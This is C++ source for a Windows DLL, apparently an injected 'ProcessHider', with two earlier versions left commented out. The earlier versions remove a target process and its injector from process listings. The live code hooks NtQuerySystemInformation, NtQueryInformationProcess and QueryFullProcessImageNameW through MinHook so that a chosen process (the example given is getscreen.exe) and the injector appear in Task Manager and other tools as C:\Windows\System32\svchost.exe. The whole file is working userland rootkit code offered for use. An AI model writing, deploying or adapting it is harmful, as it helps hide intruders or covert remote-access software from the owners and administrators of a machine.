// #include <Windows.h>
// #include <string.h>
// #include "..\include\MinHook.h"
// #include "nt_structs.h"

// #pragma comment(lib, "..\\include\\libMinHook.x64.lib")

// PNT_QUERY_SYSTEM_INFORMATION Original_NtQuerySystemInformation = nullptr;
// PNT_QUERY_SYSTEM_INFORMATION New_NtQuerySystemInformation = nullptr;
// wchar_t* g_targetProcessName = nullptr;

// bool ImageNameMatches(const UNICODE_STRING* pName, const wchar_t* target) {
//     if (!pName || !pName->Buffer || !target) return false;
//     size_t targetLen = wcslen(target);
//     size_t nameLen = pName->Length / sizeof(WCHAR);
//     if (nameLen != targetLen) return false;
//     return _wcsnicmp(pName->Buffer, target, nameLen) == 0;
// }

// NTSTATUS WINAPI Hooked_NtQuerySystemInformation(
//     SYSTEM_INFORMATION_CLASS SystemInformationClass,
//     PVOID SystemInformation,
//     ULONG SystemInformationLength,
//     PULONG ReturnLength)
// {
//     NTSTATUS status = New_NtQuerySystemInformation(
//         SystemInformationClass,
//         SystemInformation,
//         SystemInformationLength,
//         ReturnLength);

//     if (SystemInformationClass != SystemProcessInformation || !NT_SUCCESS(status))
//         return status;
//     if (!SystemInformation)
//         return status;

//     P_SYSTEM_PROCESS_INFORMATION pCurrent = (P_SYSTEM_PROCESS_INFORMATION)SystemInformation;
//     P_SYSTEM_PROCESS_INFORMATION pPrevious = nullptr;

//     while (true) {
//         bool hide = false;

//         if (pCurrent->ImageName.Buffer) {
//             // Hide the target process (e.g., notepad.exe) from Task Manager
//             if (g_targetProcessName && ImageNameMatches(&pCurrent->ImageName, g_targetProcessName)) {
//                 hide = true;
//             }
//             // Hide the injector itself from Task Manager
//             else if (ImageNameMatches(&pCurrent->ImageName, L"main.exe")) {
//                 hide = true;
//             }
//         }

//         if (hide) {
//             if (pPrevious) {
//                 if (pCurrent->NextEntryOffset == 0) {
//                     pPrevious->NextEntryOffset = 0;
//                     break;
//                 } else {
//                     pPrevious->NextEntryOffset += pCurrent->NextEntryOffset;
//                     pCurrent = (P_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pPrevious + pPrevious->NextEntryOffset);
//                     continue;
//                 }
//             }
//             // If it's the first node (System Idle Process), we can't unlink it,
//             // but it's never our target anyway.
//         } else {
//             pPrevious = pCurrent;
//         }

//         if (pCurrent->NextEntryOffset == 0)
//             break;

//         pCurrent = (P_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
//     }

//     return status;
// }

// bool set_nt_hook()
// {
//     HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
//     if (!ntdll) return false;

//     Original_NtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(ntdll, "NtQuerySystemInformation");
//     if (!Original_NtQuerySystemInformation) return false;

//     if (MH_Initialize() != MH_OK) return false;
//     if (MH_CreateHook(Original_NtQuerySystemInformation, &Hooked_NtQuerySystemInformation,
//         (LPVOID*)&New_NtQuerySystemInformation) != MH_OK) return false;
//     if (MH_EnableHook(Original_NtQuerySystemInformation) != MH_OK) return false;

//     return true;
// }

// void get_process_name() {
//     HANDLE hMap = OpenFileMappingA(FILE_MAP_ALL_ACCESS, FALSE, "GetProcessName");
//     if (!hMap) return;

//     LPVOID buf = MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, 255);
//     if (!buf) {
//         CloseHandle(hMap);
//         return;
//     }

//     char* ansiName = (char*)buf;
//     if (ansiName[0] != '\0') {
//         int wideLen = MultiByteToWideChar(CP_UTF8, 0, ansiName, -1, nullptr, 0);
//         if (wideLen > 0) {
//             g_targetProcessName = (wchar_t*)malloc(wideLen * sizeof(wchar_t));
//             if (g_targetProcessName) {
//                 MultiByteToWideChar(CP_UTF8, 0, ansiName, -1, g_targetProcessName, wideLen);
//             }
//         }
//     }

//     UnmapViewOfFile(buf);
//     CloseHandle(hMap);
// }

// BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
// {
//     switch (fdwReason) {
//     case DLL_PROCESS_ATTACH:
//         DisableThreadLibraryCalls(hinstDLL);
//         get_process_name();   // Read target name from shared memory
//         set_nt_hook();        // Install hook
//         break;
//     case DLL_PROCESS_DETACH:
//         MH_DisableHook(Original_NtQuerySystemInformation);
//         MH_Uninitialize();
//         if (g_targetProcessName) {
//             free(g_targetProcessName);
//             g_targetProcessName = nullptr;
//         }
//         break;
//     }
//     return TRUE;
// }














// #include <Windows.h>
// #include <string.h>
// #include <stdio.h>
// #include <wchar.h>
// #include "..\include\MinHook.h"
// #include "nt_structs.h"

// #pragma comment(lib, "..\\include\\libMinHook.x64.lib")

// PNT_QUERY_SYSTEM_INFORMATION Original_NtQuerySystemInformation = nullptr;
// PNT_QUERY_SYSTEM_INFORMATION New_NtQuerySystemInformation = nullptr;
// wchar_t* g_targetProcessName = nullptr;

// // Fake Windows system process name — blends perfectly with real system processes
// wchar_t g_fakeProcessName[32] = L"svchost.exe";

// void DllLog(const char* fmt, ...) {
//     char buf[512];
//     va_list args;
//     va_start(args, fmt);
//     vsnprintf(buf, sizeof(buf), fmt, args);
//     va_end(args);

//     FILE* f = nullptr;
//     char path[MAX_PATH];
//     ExpandEnvironmentStringsA("%TEMP%\\ProcessHider.log", path, MAX_PATH);
//     fopen_s(&f, path, "a");
//     if (f) {
//         fprintf(f, "[PID:%lu] %s\n", GetCurrentProcessId(), buf);
//         fclose(f);
//     }
// }

// bool ImageNameMatches(const UNICODE_STRING* pName, const wchar_t* target) {
//     if (!pName || !pName->Buffer || !target) return false;
//     size_t targetLen = wcslen(target);
//     size_t nameLen = pName->Length / sizeof(WCHAR);
//     if (nameLen != targetLen) return false;
//     return _wcsnicmp(pName->Buffer, target, nameLen) == 0;
// }

// // Overwrite the process name in-place with a fake system process name
// void MasqueradeName(UNICODE_STRING* pName) {
//     if (!pName || !pName->Buffer) return;

//     size_t fakeLen = wcslen(g_fakeProcessName);
//     size_t bufChars = pName->MaximumLength / sizeof(WCHAR);

//     // Only overwrite if the buffer is large enough to hold the fake name
//     if (bufChars >= fakeLen + 1) {
//         memcpy(pName->Buffer, g_fakeProcessName, fakeLen * sizeof(WCHAR));
//         pName->Buffer[fakeLen] = L'\0';
//         pName->Length = (USHORT)(fakeLen * sizeof(WCHAR));
//         pName->MaximumLength = (USHORT)((fakeLen + 1) * sizeof(WCHAR));
//     }
// }

// NTSTATUS WINAPI Hooked_NtQuerySystemInformation(
//     SYSTEM_INFORMATION_CLASS SystemInformationClass,
//     PVOID SystemInformation,
//     ULONG SystemInformationLength,
//     PULONG ReturnLength)
// {
//     NTSTATUS status = New_NtQuerySystemInformation(
//         SystemInformationClass,
//         SystemInformation,
//         SystemInformationLength,
//         ReturnLength);

//     if (SystemInformationClass != SystemProcessInformation || !NT_SUCCESS(status))
//         return status;
//     if (!SystemInformation)
//         return status;

//     P_SYSTEM_PROCESS_INFORMATION pCurrent = (P_SYSTEM_PROCESS_INFORMATION)SystemInformation;

//     while (true) {
//         if (pCurrent->ImageName.Buffer) {
//             // Masquerade the target process (e.g., getscreen.exe)
//             if (g_targetProcessName && ImageNameMatches(&pCurrent->ImageName, g_targetProcessName)) {
//                 MasqueradeName(&pCurrent->ImageName);
//                 DllLog("Masqueraded target PID:%lu as %ls",
//                     (ULONG)(ULONG_PTR)pCurrent->UniqueProcessId, g_fakeProcessName);
//             }
//             // Masquerade the injector itself (main.exe)
//             else if (ImageNameMatches(&pCurrent->ImageName, L"main.exe")) {
//                 MasqueradeName(&pCurrent->ImageName);
//                 DllLog("Masqueraded injector PID:%lu as %ls",
//                     (ULONG)(ULONG_PTR)pCurrent->UniqueProcessId, g_fakeProcessName);
//             }
//         }

//         if (pCurrent->NextEntryOffset == 0)
//             break;

//         pCurrent = (P_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
//     }

//     return status;
// }

// bool set_nt_hook()
// {
//     HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
//     if (!ntdll) return false;

//     Original_NtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(ntdll, "NtQuerySystemInformation");
//     if (!Original_NtQuerySystemInformation) return false;

//     if (MH_Initialize() != MH_OK) return false;
//     if (MH_CreateHook(Original_NtQuerySystemInformation, &Hooked_NtQuerySystemInformation,
//         (LPVOID*)&New_NtQuerySystemInformation) != MH_OK) return false;
//     if (MH_EnableHook(Original_NtQuerySystemInformation) != MH_OK) return false;

//     DllLog("Hook installed successfully");
//     return true;
// }

// void get_process_name() {
//     HANDLE hMap = OpenFileMappingA(FILE_MAP_ALL_ACCESS, FALSE, "GetProcessName");
//     if (!hMap) {
//         DllLog("OpenFileMappingA failed. Error: %lu", GetLastError());
//         return;
//     }

//     LPVOID buf = MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, 255);
//     if (!buf) {
//         CloseHandle(hMap);
//         DllLog("MapViewOfFile failed");
//         return;
//     }

//     char* ansiName = (char*)buf;
//     if (ansiName[0] != '\0') {
//         int wideLen = MultiByteToWideChar(CP_UTF8, 0, ansiName, -1, nullptr, 0);
//         if (wideLen > 0) {
//             g_targetProcessName = (wchar_t*)malloc(wideLen * sizeof(wchar_t));
//             if (g_targetProcessName) {
//                 MultiByteToWideChar(CP_UTF8, 0, ansiName, -1, g_targetProcessName, wideLen);
//                 DllLog("Target process to masquerade: %ls -> %ls", g_targetProcessName, g_fakeProcessName);
//             }
//         }
//     } else {
//         DllLog("Shared memory was empty");
//     }

//     UnmapViewOfFile(buf);
//     CloseHandle(hMap);
// }

// BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
// {
//     switch (fdwReason) {
//     case DLL_PROCESS_ATTACH:
//         DisableThreadLibraryCalls(hinstDLL);
//         DllLog("DLL attached to PID:%lu", GetCurrentProcessId());
//         get_process_name();
//         set_nt_hook();
//         break;
//     case DLL_PROCESS_DETACH:
//         DllLog("DLL detached");
//         MH_DisableHook(Original_NtQuerySystemInformation);
//         MH_Uninitialize();
//         if (g_targetProcessName) {
//             free(g_targetProcessName);
//             g_targetProcessName = nullptr;
//         }
//         break;
//     }
//     return TRUE;
// }

























#include <Windows.h>
#include <string.h>
#include <stdio.h>
#include <wchar.h>
#include <psapi.h>
#include "..\include\MinHook.h"
#include "nt_structs.h"

#pragma comment(lib, "..\\include\\libMinHook.x64.lib")
#pragma comment(lib, "psapi.lib")

// ============================================================================
// Typedefs for hooks
// ============================================================================
typedef NTSTATUS(NTAPI* PNT_QUERY_SYSTEM_INFORMATION)(
    SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);

typedef NTSTATUS(NTAPI* PNT_QUERY_INFORMATION_PROCESS)(
    HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

typedef BOOL(WINAPI* PQUERY_FULL_PROCESS_IMAGE_NAME_W)(
    HANDLE, DWORD, LPWSTR, PDWORD);

// ============================================================================
// Globals
// ============================================================================
PNT_QUERY_SYSTEM_INFORMATION        g_OrigNtQuerySystemInformation = nullptr;
PNT_QUERY_INFORMATION_PROCESS       g_OrigNtQueryInformationProcess = nullptr;
PQUERY_FULL_PROCESS_IMAGE_NAME_W    g_OrigQueryFullProcessImageNameW = nullptr;

PNT_QUERY_SYSTEM_INFORMATION        g_TrampNtQuerySystemInformation = nullptr;

wchar_t* g_targetProcessName = nullptr;
DWORD    g_injectorPid = 0;

// Fake identity — must match a real Windows system process
wchar_t g_fakeProcessName[32] = L"svchost.exe";
wchar_t g_fakeNtPath[128]     = L"\\??\\C:\\Windows\\System32\\svchost.exe";
wchar_t g_fakeWin32Path[128]  = L"C:\\Windows\\System32\\svchost.exe";

// ============================================================================
// Logging
// ============================================================================
void DllLog(const char* fmt, ...) {
    char buf[512];
    va_list args;
    va_start(args, fmt);
    vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);

    FILE* f = nullptr;
    char path[MAX_PATH];
    ExpandEnvironmentStringsA("%TEMP%\\ProcessHider.log", path, MAX_PATH);
    fopen_s(&f, path, "a");
    if (f) {
        fprintf(f, "[PID:%lu] %s\n", GetCurrentProcessId(), buf);
        fclose(f);
    }
}

// ============================================================================
// Helpers
// ============================================================================
bool ImageNameMatches(const UNICODE_STRING* pName, const wchar_t* target) {
    if (!pName || !pName->Buffer || !target) return false;
    size_t targetLen = wcslen(target);
    size_t nameLen = pName->Length / sizeof(WCHAR);
    if (nameLen != targetLen) return false;
    return _wcsnicmp(pName->Buffer, target, nameLen) == 0;
}

bool IsTargetProcess(DWORD pid) {
    if (!g_targetProcessName) return false;
    if (pid == 0) return false;

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProcess) return false;

    wchar_t name[MAX_PATH] = { 0 };
    DWORD size = MAX_PATH;
    BOOL gotName = FALSE;

    // Try QueryFullProcessImageName first
    if (g_OrigQueryFullProcessImageNameW) {
        gotName = g_OrigQueryFullProcessImageNameW(hProcess, 0, name, &size);
    } else {
        gotName = QueryFullProcessImageNameW(hProcess, 0, name, &size);
    }

    CloseHandle(hProcess);

    if (!gotName) return false;

    // Extract basename
    wchar_t* base = wcsrchr(name, L'\\');
    if (base) base++;
    else base = name;

    return _wcsicmp(base, g_targetProcessName) == 0;
}

bool IsInjectorProcess(DWORD pid) {
    return (g_injectorPid != 0 && pid == g_injectorPid);
}

bool ShouldMasquerade(DWORD pid, const UNICODE_STRING* pName) {
    if (pid == 0) return false;
    if (g_targetProcessName && ImageNameMatches(pName, g_targetProcessName)) return true;
    if (IsInjectorProcess(pid)) return true;
    return false;
}

// ============================================================================
// Masquerade UNICODE_STRING in-place
// ============================================================================
void MasqueradeName(UNICODE_STRING* pName) {
    if (!pName || !pName->Buffer) return;

    size_t fakeLen = wcslen(g_fakeProcessName);
    size_t bufChars = pName->MaximumLength / sizeof(WCHAR);

    if (bufChars >= fakeLen + 1) {
        memcpy(pName->Buffer, g_fakeProcessName, fakeLen * sizeof(WCHAR));
        pName->Buffer[fakeLen] = L'\0';
        pName->Length = (USHORT)(fakeLen * sizeof(WCHAR));
    }
}

// ============================================================================
// Hook 1: NtQuerySystemInformation
// Handles both SystemProcessInformation (0x05) and
// SystemExtendedProcessInformation (0x59)
// ============================================================================
NTSTATUS WINAPI Hooked_NtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength)
{
    NTSTATUS status = g_TrampNtQuerySystemInformation(
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength);

    if (!NT_SUCCESS(status) || !SystemInformation)
        return status;

    // Hook both standard (0x05) and extended (0x59) process info
    if (SystemInformationClass != SystemProcessInformation &&
        SystemInformationClass != (SYSTEM_INFORMATION_CLASS)0x59)
        return status;

    P_SYSTEM_PROCESS_INFORMATION pCurrent = (P_SYSTEM_PROCESS_INFORMATION)SystemInformation;

    while (true) {
        if (pCurrent->ImageName.Buffer) {
            DWORD pid = (DWORD)(ULONG_PTR)pCurrent->UniqueProcessId;

            if (ShouldMasquerade(pid, &pCurrent->ImageName)) {
                MasqueradeName(&pCurrent->ImageName);
            }
        }

        if (pCurrent->NextEntryOffset == 0)
            break;

        pCurrent = (P_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
    }

    return status;
}

// ============================================================================
// Hook 2: NtQueryInformationProcess
// Task Manager calls this with ProcessImageFileName (27) to get the
// executable path for the "Apps" section and icon resolution.
// ============================================================================
NTSTATUS WINAPI Hooked_NtQueryInformationProcess(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength)
{
    NTSTATUS status = g_OrigNtQueryInformationProcess(
        ProcessHandle, ProcessInformationClass,
        ProcessInformation, ProcessInformationLength, ReturnLength);

    if (!NT_SUCCESS(status))
        return status;

    // ProcessImageFileName = 27
    if (ProcessInformationClass != (PROCESSINFOCLASS)27)
        return status;

    DWORD pid = GetProcessId(ProcessHandle);
    if (pid == 0) return status;

    bool isTarget = false;
    if (g_targetProcessName) {
        // Check by querying the name first (avoid recursion)
        wchar_t checkName[MAX_PATH] = { 0 };
        DWORD checkSize = MAX_PATH;
        if (g_OrigQueryFullProcessImageNameW &&
            g_OrigQueryFullProcessImageNameW(ProcessHandle, 0, checkName, &checkSize)) {
            wchar_t* base = wcsrchr(checkName, L'\\');
            if (base) base++; else base = checkName;
            if (_wcsicmp(base, g_targetProcessName) == 0) isTarget = true;
        }
    }
    if (!isTarget && IsInjectorProcess(pid)) isTarget = true;
    if (!isTarget) return status;

    // Overwrite the returned NT path
    UNICODE_STRING* pUni = (UNICODE_STRING*)ProcessInformation;
    if (!pUni || !pUni->Buffer) return status;

    size_t fakeLen = wcslen(g_fakeNtPath);
    size_t bufChars = pUni->MaximumLength / sizeof(WCHAR);

    if (bufChars >= fakeLen + 1) {
        memcpy(pUni->Buffer, g_fakeNtPath, fakeLen * sizeof(WCHAR));
        pUni->Buffer[fakeLen] = L'\0';
        pUni->Length = (USHORT)(fakeLen * sizeof(WCHAR));
        DllLog("Masqueraded NT path for PID:%lu", pid);
    }

    return status;
}

// ============================================================================
// Hook 3: QueryFullProcessImageNameW
// Used by Task Manager, Process Explorer, and many sysadmin tools
// ============================================================================
BOOL WINAPI Hooked_QueryFullProcessImageNameW(
    HANDLE hProcess,
    DWORD dwFlags,
    LPWSTR lpExeName,
    PDWORD lpdwSize)
{
    BOOL result = g_OrigQueryFullProcessImageNameW(hProcess, dwFlags, lpExeName, lpdwSize);

    if (!result || !lpExeName || !lpdwSize) return result;

    DWORD pid = GetProcessId(hProcess);
    if (pid == 0) return result;

    if (IsTargetProcess(pid) || IsInjectorProcess(pid)) {
        size_t fakeLen = wcslen(g_fakeWin32Path);
        if (*lpdwSize > fakeLen) {
            wcscpy_s(lpExeName, *lpdwSize, g_fakeWin32Path);
            *lpdwSize = (DWORD)fakeLen;
            DllLog("Masqueraded Win32 path for PID:%lu", pid);
        }
    }

    return result;
}

// ============================================================================
// Hook installation
// ============================================================================
bool InstallHooks() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return false;

    // 1. NtQuerySystemInformation
    g_OrigNtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(ntdll, "NtQuerySystemInformation");
    if (!g_OrigNtQuerySystemInformation) return false;

    // 2. NtQueryInformationProcess
    g_OrigNtQueryInformationProcess = (PNT_QUERY_INFORMATION_PROCESS)GetProcAddress(ntdll, "NtQueryInformationProcess");
    if (!g_OrigNtQueryInformationProcess) return false;

    // 3. QueryFullProcessImageNameW (kernel32)
    HMODULE kernel32 = GetModuleHandleW(L"kernel32.dll");
    PQUERY_FULL_PROCESS_IMAGE_NAME_W pQueryFull = (PQUERY_FULL_PROCESS_IMAGE_NAME_W)GetProcAddress(kernel32, "QueryFullProcessImageNameW");
    if (!pQueryFull) return false;

    if (MH_Initialize() != MH_OK) return false;

    // Hook NtQuerySystemInformation
    if (MH_CreateHook(g_OrigNtQuerySystemInformation, &Hooked_NtQuerySystemInformation,
        (LPVOID*)&g_TrampNtQuerySystemInformation) != MH_OK) return false;
    if (MH_EnableHook(g_OrigNtQuerySystemInformation) != MH_OK) return false;

    // Hook NtQueryInformationProcess
    if (MH_CreateHook(g_OrigNtQueryInformationProcess, &Hooked_NtQueryInformationProcess,
        (LPVOID*)&g_OrigNtQueryInformationProcess) != MH_OK) return false;
    if (MH_EnableHook(g_OrigNtQueryInformationProcess) != MH_OK) return false;

    // Hook QueryFullProcessImageNameW
    if (MH_CreateHook(pQueryFull, &Hooked_QueryFullProcessImageNameW,
        (LPVOID*)&g_OrigQueryFullProcessImageNameW) != MH_OK) return false;
    if (MH_EnableHook(pQueryFull) != MH_OK) return false;

    DllLog("All hooks installed successfully");
    return true;
}

// ============================================================================
// Shared memory: receive target name + injector PID
// Layout: [0-127] target name, [128-131] injector PID (DWORD)
// ============================================================================
void ReadSharedMemory() {
    HANDLE hMap = OpenFileMappingA(FILE_MAP_ALL_ACCESS, FALSE, "GetProcessName");
    if (!hMap) {
        DllLog("OpenFileMappingA failed: %lu", GetLastError());
        return;
    }

    LPVOID buf = MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, 256);
    if (!buf) {
        CloseHandle(hMap);
        DllLog("MapViewOfFile failed");
        return;
    }

    char* data = (char*)buf;

    // Read target process name
    if (data[0] != '\0') {
        int wideLen = MultiByteToWideChar(CP_UTF8, 0, data, -1, nullptr, 0);
        if (wideLen > 0) {
            g_targetProcessName = (wchar_t*)malloc(wideLen * sizeof(wchar_t));
            if (g_targetProcessName) {
                MultiByteToWideChar(CP_UTF8, 0, data, -1, g_targetProcessName, wideLen);
            }
        }
    }

    // Read injector PID (stored at offset 128)
    memcpy(&g_injectorPid, data + 128, sizeof(DWORD));
    if (g_injectorPid == 0) {
        // Fallback: if injector didn't write PID, try to detect by name
        // (kept for backward compatibility)
    }

    DllLog("Config loaded: target=%ls, injectorPID=%lu", 
        g_targetProcessName ? g_targetProcessName : L"(none)", g_injectorPid);

    UnmapViewOfFile(buf);
    CloseHandle(hMap);
}

// ============================================================================
// DllMain
// ============================================================================
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hinstDLL);
        DllLog("DLL attached to PID:%lu", GetCurrentProcessId());
        ReadSharedMemory();
        InstallHooks();
        break;

    case DLL_PROCESS_DETACH:
        DllLog("DLL detached from PID:%lu", GetCurrentProcessId());
        MH_DisableHook(MH_ALL_HOOKS);
        MH_Uninitialize();
        if (g_targetProcessName) {
            free(g_targetProcessName);
            g_targetProcessName = nullptr;
        }
        break;
    }
    return TRUE;
}